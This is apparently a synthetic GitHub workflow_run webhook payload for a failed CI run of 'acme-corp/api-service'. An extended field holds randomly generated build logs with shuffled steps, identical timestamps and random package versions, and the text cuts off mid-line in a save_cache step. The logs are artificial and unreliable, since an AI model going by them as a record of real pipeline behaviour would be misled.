{
  "action": "completed",
  "workflow_run": {
    "id": 56,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "81db95b7af35fb85bfe57c60e832ccd41cece1b4",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-22T12:00:18.462691Z",
    "updated_at": "2025-11-22T12:01:23.336418Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\n  PASS: test_cache_hit (377ms)\n  PASS: test_api_health (240ms)\n[12:00:18] INFO: Processing request\nInstalling lodash@5.9.0\n  PASS: test_api_health (175ms)\nCache hit for key-5860\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n  PASS: test_cache_hit (105ms)\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 test completed\n\u2717 build failed with exit code 115\nCompiling src/main.py...\nStep 6/10: Building\nCache hit for key-6622\nWARNING: express has known vulnerabilities\nCompiling src/service.java...\nInstalling lodash@3.17.0\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-5195\nInstalling axios@3.6.0\nCache hit for key-8386\nException: RuntimeError\nInstalling jest@3.20.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/main.py...\nInstalling axios@3.11.0\nCache hit for key-5727\n  PASS: test_api_health (110ms)\n\u2713 lint completed\nInstalling axios@5.6.0\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 test completed\nCache hit for key-7427\nStep 6/10: Building\nCache hit for key-2994\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-5976\nInstalling lodash@3.6.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nCache hit for key-6367\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:18] INFO: Processing request\nInstalling axios@3.9.0\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_auth_login (450ms)\n\u2713 lint completed\nCache hit for key-9214\nInstalling axios@1.2.0\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:18] INFO: Processing request\n\u2713 build completed\nInstalling jest@3.17.0\n[12:00:18] INFO: Processing request\n\u2713 build completed\n[12:00:18] INFO: Processing request\nStep 1/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-5401\nStep 4/10: Building\nWARNING: axios has known vulnerabilities\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nInstalling prettier@1.1.0\nStep 2/10: Building\nInstalling prettier@3.5.0\nStep 8/10: Building\n  PASS: test_user_create (291ms)\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (249ms)\nCache hit for key-9480\nStep 9/10: Building\nInstalling eslint@3.2.0\nInstalling prettier@2.6.0\nStep 1/10: Building\nStep 1/10: Building\nInstalling react@1.14.0\nInstalling express@1.1.0\nCompiling src/utils.go...\nCompiling src/handler.rs...\nWARNING: express has known vulnerabilities\n  PASS: test_user_create (112ms)\nArtifact uploaded: build.tar.gz (9MB)\nInstalling prettier@5.10.0\n\u2713 build completed\n  PASS: test_user_create (136ms)\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nWARNING: jest has known vulnerabilities\nCompiling src/index.js...\nCache hit for key-8051\nCompiling src/main.py...\n  PASS: test_user_create (149ms)\nStep 2/10: Building\n  PASS: test_db_connect (162ms)\nInstalling eslint@5.0.0\nCompiling src/service.java...\n[12:00:18] ERROR: Connection failed\n\u2713 build completed\nInstalling express@4.15.0\nCache hit for key-2396\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-1308\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (93ms)\nStep 7/10: Building\nInstalling webpack@4.14.0\nCache hit for key-6174\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-4716\n\u2713 lint completed\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCache hit for key-3236\n\u2713 build completed\nStep 6/10: Building\nCache hit for key-6474\n[12:00:18] INFO: Processing request\nStep 4/10: Building\nCache hit for key-6225\nInstalling express@2.20.0\nCompiling src/main.py...\nStep 9/10: Building\nInstalling react@5.9.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-2147\n[12:00:18] INFO: Processing request\nCache hit for key-1464\nStep 2/10: Building\nCache hit for key-8959\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_auth_login (95ms)\nStep 6/10: Building\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 test completed\n\u2713 build completed\nWARNING: axios has known vulnerabilities\n\u2713 build completed\nCompiling src/service.java...\n\u2713 lint completed\nCompiling src/service.java...\nStep 1/10: Building\nStep 9/10: Building\nCache hit for key-3981\n[12:00:18] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (36MB)\nStep 8/10: Building\n  PASS: test_db_connect (99ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 test completed\nCompiling src/app.ts...\nInstalling lodash@4.13.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-1534\n[12:00:18] WARN: Deprecated API usage\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\n=== Step type_check completed ===\n=== Step: setup_environment ===\nStep 10/10: Building\nInstalling react@4.14.0\nCache hit for key-3695\nCache hit for key-3926\n\u2713 test completed\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_db_connect (267ms)\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-8427\n\u2713 test completed\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nCache hit for key-2776\nException: NullPointerException\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (25MB)\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@2.16.0\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\nStep 7/10: Building\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-2541\n\u2713 build completed\n\u2713 build completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/main.py...\n\u2713 lint completed\n  PASS: test_auth_login (271ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_db_connect (481ms)\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nCompiling src/index.js...\nStep 7/10: Building\nStep 9/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-8107\nWARNING: eslint has known vulnerabilities\nInstalling webpack@3.10.0\n[12:00:18] INFO: Processing request\nCache hit for key-9536\n  PASS: test_auth_login (201ms)\n\u2717 build failed with exit code 26\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (40MB)\nInstalling react@4.6.0\nException: TypeError\n  PASS: test_auth_login (460ms)\nCache hit for key-7293\n[12:00:18] INFO: Processing request\nInstalling jest@4.10.0\n  PASS: test_api_health (208ms)\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (363ms)\nStep 3/10: Building\nCache hit for key-7286\n\u2717 build failed with exit code 77\nInstalling eslint@1.17.0\n\u2713 lint completed\n  PASS: test_user_create (328ms)\nCache hit for key-1553\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:18] INFO: Processing request\nCache hit for key-2164\nCompiling src/service.java...\nCompiling src/utils.go...\nInstalling webpack@3.2.0\nCompiling src/index.js...\n\u2713 test completed\n  PASS: test_db_connect (283ms)\nStep 5/10: Building\nInstalling express@1.3.0\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nInstalling webpack@4.14.0\n\u2713 test completed\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-1405\nInstalling prettier@4.13.0\n  PASS: test_api_health (109ms)\nInstalling express@1.16.0\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_cache_hit (356ms)\n[12:00:18] INFO: Processing request\nInstalling lodash@4.19.0\nStep 7/10: Building\nStep 4/10: Building\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u2713 build completed\n[12:00:18] INFO: Processing request\nStep 5/10: Building\nStep 9/10: Building\nStep 7/10: Building\nInstalling prettier@1.0.0\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCache hit for key-4670\nException: RuntimeError\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nStep 1/10: Building\nStep 4/10: Building\nInstalling axios@3.18.0\nStep 3/10: Building\nCache hit for key-9089\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-7469\nArtifact uploaded: build.tar.gz (45MB)\nInstalling webpack@1.10.0\n  PASS: test_cache_hit (345ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-5779\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\n\u2713 test completed\nInstalling react@2.2.0\nInstalling eslint@3.6.0\nCache hit for key-6181\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nCache hit for key-6046\nStep 6/10: Building\n  PASS: test_db_connect (459ms)\nCompiling src/utils.go...\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\n\u2713 lint completed\n[12:00:18] ERROR: Connection failed\nCache hit for key-8813\n  PASS: test_auth_login (236ms)\nCache hit for key-7196\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (49MB)\nInstalling eslint@3.7.0\n\u2713 test completed\nStep 3/10: Building\nCompiling src/app.ts...\nCache hit for key-2327\nInstalling lodash@1.6.0\n\u2713 build completed\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-7434\n  PASS: test_cache_hit (59ms)\n  PASS: test_api_health (226ms)\nCompiling src/utils.go...\nCache hit for key-8626\n[12:00:18] INFO: Processing request\nCache hit for key-1656\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/app.ts...\nCache hit for key-8402\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\nInstalling jest@5.3.0\nInstalling lodash@1.18.0\nInstalling lodash@1.0.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/utils.go...\n\u2713 lint completed\n  PASS: test_user_create (341ms)\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-2037\n  PASS: test_auth_login (161ms)\nCache hit for key-8428\n=== Step setup_environment completed ===\n=== Step: deploy_production ===\nStep 7/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (9MB)\nStep 2/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-2414\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCache hit for key-3459\nCache hit for key-7990\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 lint completed\nCache hit for key-1377\nInstalling react@4.3.0\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 test completed\nCompiling src/index.js...\n\u2717 build failed with exit code 60\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\nStep 8/10: Building\nCache hit for key-6821\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nCompiling src/utils.go...\nStep 4/10: Building\nStep 7/10: Building\nStep 1/10: Building\n\u2717 build failed with exit code 75\nCache hit for key-5997\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-8571\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\nInstalling express@2.12.0\nCache hit for key-3675\n  PASS: test_db_connect (140ms)\n  PASS: test_api_health (488ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_api_health (482ms)\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n\u2713 test completed\nFAILED: test_auth_login\nInstalling react@2.18.0\nInstalling lodash@5.1.0\n\u2713 lint completed\n\u2713 lint completed\n  PASS: test_db_connect (445ms)\nArtifact uploaded: build.tar.gz (24MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling prettier@4.5.0\nCompiling src/app.ts...\n[12:00:18] ERROR: Connection failed\nCompiling src/utils.go...\nCompiling src/main.py...\n  PASS: test_db_connect (409ms)\nInstalling jest@5.19.0\nInstalling eslint@1.13.0\nStep 8/10: Building\nCompiling src/index.js...\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nCache hit for key-6954\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nInstalling eslint@3.7.0\n\u2717 build failed with exit code 76\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:18] INFO: Processing request\nCache hit for key-8576\nCache hit for key-8757\nCache hit for key-5763\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/app.ts...\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_cache_hit (432ms)\n  PASS: test_api_health (481ms)\nStep 8/10: Building\nFAILED: test_api_health\nCache hit for key-7649\n  PASS: test_api_health (120ms)\nCache hit for key-3485\nArtifact uploaded: build.tar.gz (22MB)\nInstalling prettier@5.5.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\nCache hit for key-2630\nArtifact uploaded: build.tar.gz (49MB)\nWARNING: react has known vulnerabilities\n\u2713 test completed\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 lint completed\n  PASS: test_auth_login (320ms)\nInstalling eslint@5.2.0\nInstalling eslint@5.0.0\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nStep 9/10: Building\nStep 7/10: Building\n\u2713 build completed\n  PASS: test_user_create (115ms)\nArtifact uploaded: build.tar.gz (32MB)\nInstalling jest@5.11.0\n  PASS: test_cache_hit (434ms)\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_api_health (294ms)\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (4MB)\nInstalling jest@3.20.0\nCache hit for key-6914\n  PASS: test_api_health (443ms)\nCompiling src/handler.rs...\nInstalling jest@2.8.0\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (320ms)\n[12:00:18] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 build completed\n  PASS: test_cache_hit (499ms)\nCache hit for key-5846\n  PASS: test_db_connect (219ms)\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nWARNING: react has known vulnerabilities\nCache hit for key-4756\n  PASS: test_cache_hit (12ms)\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-9928\nStep 8/10: Building\n\u2713 lint completed\nCompiling src/service.java...\nFAILED: test_user_create\n[12:00:18] INFO: Processing request\nInstalling webpack@1.7.0\nInstalling react@4.0.0\n  PASS: test_db_connect (123ms)\nCompiling src/index.js...\nInstalling webpack@3.4.0\nCache hit for key-6257\nWARNING: axios has known vulnerabilities\n[12:00:18] INFO: Processing request\nWARNING: react has known vulnerabilities\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nInstalling prettier@5.8.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-2656\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (4ms)\nStep 6/10: Building\nStep 10/10: Building\n  PASS: test_cache_hit (229ms)\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_user_create (63ms)\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (236ms)\n[12:00:18] WARN: Deprecated API usage\nCompiling src/handler.rs...\nInstalling axios@2.1.0\nCompiling src/utils.go...\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nCache hit for key-6992\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-4999\nStep 6/10: Building\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\nStep 8/10: Building\n  PASS: test_db_connect (398ms)\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_api_health (148ms)\n[12:00:18] INFO: Processing request\nStep 7/10: Building\n  PASS: test_user_create (258ms)\nInstalling express@1.13.0\n\u2713 test completed\n\u2713 test completed\n  PASS: test_auth_login (461ms)\nCache hit for key-3987\nInstalling prettier@5.10.0\n[12:00:18] WARN: Deprecated API usage\nStep 1/10: Building\nInstalling axios@4.12.0\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\nCompiling src/utils.go...\nInstalling lodash@4.19.0\nCache hit for key-8249\n\u2713 build completed\n  PASS: test_auth_login (372ms)\n\u2713 build completed\nInstalling eslint@2.17.0\nCompiling src/main.py...\nStep 1/10: Building\nCompiling src/handler.rs...\nCache hit for key-6742\nException: TypeError\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_user_create (98ms)\nCache hit for key-5181\n[12:00:18] INFO: Processing request\nInstalling eslint@4.3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nCompiling src/app.ts...\nStep 8/10: Building\n[12:00:18] INFO: Processing request\n\u2713 build completed\n  PASS: test_api_health (13ms)\nFAILED: test_db_connect\nInstalling jest@2.17.0\nInstalling react@5.19.0\n\u2713 test completed\n\u2713 build completed\n  PASS: test_user_create (494ms)\n  PASS: test_api_health (451ms)\n  PASS: test_auth_login (319ms)\nInstalling prettier@5.9.0\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_auth_login (270ms)\n[12:00:18] INFO: Processing request\n\u2713 test completed\nInstalling webpack@4.0.0\n  PASS: test_user_create (170ms)\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_auth_login (277ms)\n\u2713 build completed\nWARNING: express has known vulnerabilities\nInstalling prettier@1.0.0\n  PASS: test_api_health (360ms)\n  PASS: test_user_create (85ms)\nArtifact uploaded: build.tar.gz (23MB)\nException: TypeError\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (267ms)\nCompiling src/handler.rs...\nCache hit for key-3517\nCompiling src/app.ts...\nCompiling src/utils.go...\n\u2713 test completed\nException: RuntimeError\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:18] INFO: Processing request\nStep 4/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 lint completed\nCache hit for key-2533\n[12:00:18] INFO: Processing request\nCache hit for key-7462\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-8894\nArtifact uploaded: build.tar.gz (46MB)\nStep 10/10: Building\nCache hit for key-4152\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-6023\nCache hit for key-4419\nCompiling src/service.java...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCompiling src/handler.rs...\nInstalling express@4.0.0\nInstalling jest@4.18.0\n\u2713 build completed\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\nCache hit for key-2228\nCompiling src/app.ts...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-8666\n\u2713 build completed\nCompiling src/handler.rs...\n  PASS: test_user_create (153ms)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-4763\nCache hit for key-8996\nCache hit for key-3172\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nStep 7/10: Building\nInstalling eslint@1.3.0\nInstalling axios@4.8.0\nInstalling lodash@2.15.0\nStep 9/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-4785\n\u2713 test completed\n  PASS: test_cache_hit (450ms)\nInstalling prettier@1.14.0\n[12:00:18] INFO: Processing request\nCache hit for key-3608\nInstalling react@4.16.0\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (263ms)\n\u2713 build completed\n  PASS: test_api_health (122ms)\n\u2713 build completed\n\u2713 lint completed\nStep 8/10: Building\nInstalling eslint@5.19.0\n  PASS: test_api_health (389ms)\n[12:00:18] INFO: Processing request\nInstalling lodash@1.16.0\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_db_connect (431ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:18] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-3855\nCompiling src/app.ts...\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\nInstalling express@5.2.0\nStep 8/10: Building\nCache hit for key-7695\nCache hit for key-2916\nInstalling react@1.9.0\n  PASS: test_db_connect (286ms)\n  PASS: test_db_connect (428ms)\nInstalling lodash@2.14.0\nInstalling react@1.6.0\n  PASS: test_auth_login (170ms)\n[12:00:18] INFO: Processing request\nWARNING: webpack has known vulnerabilities\n  PASS: test_api_health (39ms)\nWARNING: lodash has known vulnerabilities\nCompiling src/handler.rs...\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-7485\n[12:00:18] WARN: Deprecated API usage\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\nWARNING: webpack has known vulnerabilities\nStep 2/10: Building\nStep 9/10: Building\n\u2713 lint completed\nCache hit for key-7430\n\u2713 build completed\n\u2713 test completed\nCompiling src/service.java...\nCompiling src/index.js...\nException: RuntimeError\n  PASS: test_db_connect (17ms)\n[12:00:18] INFO: Processing request\nCache hit for key-9970\nCache hit for key-9739\nCache hit for key-7454\nCache hit for key-2909\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (14MB)\nStep 6/10: Building\n\u2713 lint completed\nCache hit for key-6878\nCache hit for key-6736\nInstalling jest@3.18.0\nCache hit for key-7914\n  PASS: test_cache_hit (240ms)\nStep 1/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_api_health (192ms)\n  PASS: test_auth_login (248ms)\n\u2713 build completed\n  PASS: test_auth_login (36ms)\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (228ms)\n\u2713 test completed\nCache hit for key-7585\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_db_connect (42ms)\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (20MB)\nInstalling webpack@3.0.0\n\u2713 test completed\n\u2717 build failed with exit code 75\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (483ms)\n\u2713 build completed\n[12:00:18] ERROR: Connection failed\nInstalling webpack@2.10.0\nCache hit for key-3841\nCache hit for key-5933\nArtifact uploaded: build.tar.gz (35MB)\nStep 2/10: Building\nCompiling src/utils.go...\nCompiling src/index.js...\n  PASS: test_user_create (372ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nStep 10/10: Building\nCompiling src/main.py...\nInstalling lodash@5.6.0\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-5747\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nStep 2/10: Building\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_auth_login (14ms)\nStep 10/10: Building\n\u2713 lint completed\nCompiling src/app.ts...\nCompiling src/service.java...\nCache hit for key-7298\n  PASS: test_cache_hit (342ms)\nCache hit for key-1103\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_api_health (379ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nStep 2/10: Building\n  PASS: test_api_health (339ms)\nCache hit for key-6725\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nInstalling prettier@2.18.0\n  PASS: test_db_connect (257ms)\n  PASS: test_api_health (493ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (4MB)\nInstalling express@3.2.0\nArtifact uploaded: build.tar.gz (10MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/main.py...\nCompiling src/utils.go...\nException: TypeError\nInstalling axios@1.4.0\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-1329\n  PASS: test_user_create (108ms)\n[12:00:18] ERROR: Connection failed\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (50MB)\nInstalling webpack@2.0.0\nException: TypeError\nCache hit for key-9924\n\u2713 lint completed\nStep 2/10: Building\nCache hit for key-9125\nInstalling lodash@4.2.0\nCache hit for key-8456\nCache hit for key-7864\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_api_health (485ms)\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling prettier@1.11.0\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-5226\nCompiling src/index.js...\nCache hit for key-8920\n[12:00:18] INFO: Processing request\nCache hit for key-1652\nStep 6/10: Building\nCache hit for key-2141\nInstalling webpack@5.16.0\nArtifact uploaded: build.tar.gz (48MB)\nInstalling jest@1.2.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nInstalling axios@3.6.0\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/service.java...\nCache hit for key-8340\nFAILED: test_user_create\nStep 9/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (35ms)\nArtifact uploaded: build.tar.gz (10MB)\nInstalling axios@1.15.0\n  PASS: test_db_connect (488ms)\n\u2713 build completed\nCompiling src/handler.rs...\nStep 9/10: Building\nInstalling axios@4.20.0\nStep 8/10: Building\n  PASS: test_db_connect (420ms)\n  PASS: test_auth_login (334ms)\nInstalling express@5.16.0\nArtifact uploaded: build.tar.gz (38MB)\nWARNING: jest has known vulnerabilities\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-4541\nCompiling src/index.js...\n  PASS: test_user_create (96ms)\nCompiling src/handler.rs...\nInstalling webpack@2.1.0\nCache hit for key-4429\nInstalling webpack@2.7.0\n[12:00:18] INFO: Processing request\nInstalling webpack@2.2.0\nArtifact uploaded: build.tar.gz (10MB)\nInstalling webpack@2.18.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-3119\n=== Step setup_node completed ===\n=== Step: save_cache ===\nCompiling src/app.ts...\n[12:00:18] 